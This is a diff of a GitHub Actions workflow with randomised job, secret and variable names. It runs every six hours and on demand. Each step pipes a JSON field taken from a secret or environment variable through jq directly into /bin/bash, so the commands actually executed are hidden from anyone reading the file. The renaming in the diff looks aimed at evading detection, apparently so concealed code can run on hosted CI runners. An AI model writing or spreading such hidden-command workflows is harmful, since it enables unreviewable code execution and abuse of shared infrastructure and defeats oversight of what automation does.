@@ -1,26 +1,32 @@
 name: yebawang8765
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
+    - cron: '0 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yebawang8765
         env:
-          wbo60300: ${{ secrets.wbo60300 }}
+          cfyx987: ${{ secrets.cfyx987 }}
         run: |
-          echo $wbo60300 | jq -r .btnpl012 | /bin/bash
-          echo $wiudx2998 | jq -r .ysdp234 | /bin/bash
-          echo $kb7 | jq -r .qiqf6278 | /bin/bash
-          echo $d5 | jq -r .re3608 | /bin/bash
-          echo $jfffg29 | jq -r .r7 | /bin/bash
-          echo $xq08 | jq -r .bxum9684 | /bin/bash
-          echo $qidi2 | jq -r .lc5 | /bin/bash
-          echo $smqur1063 | jq -r .uzemc633 | /bin/bash
-          echo $vw32 | jq -r .uaso141 | /bin/bash
-          echo $c7874 | jq -r .jiyus297 | /bin/bash
+          echo $cfyx987 | jq -r .ljci624 | /bin/bash
+          echo $n061 | jq -r .ayi0099 | /bin/bash
+          echo $dgtsz73080 | jq -r .ijhsz71635 | /bin/bash
+          echo $khfe20013 | jq -r .ngd6 | /bin/bash
+          echo $wzz082 | jq -r .wswc07 | /bin/bash
+          echo $a1333 | jq -r .xae8 | /bin/bash
+          echo $pku11027 | jq -r .n36 | /bin/bash
+          echo $jxq702 | jq -r .uq7 | /bin/bash
+          echo $s4361 | jq -r .w8 | /bin/bash
+          echo $myo1 | jq -r .se65709 | /bin/bash
+          echo $e975 | jq -r .frjje25 | /bin/bash
+          echo $iggk06 | jq -r .uj779 | /bin/bash
+          echo $blz62 | jq -r .vp79613 | /bin/bash
+          echo $kqg24472 | jq -r .y7 | /bin/bash
+          echo $ze2027 | jq -r .d2 | /bin/bash
 
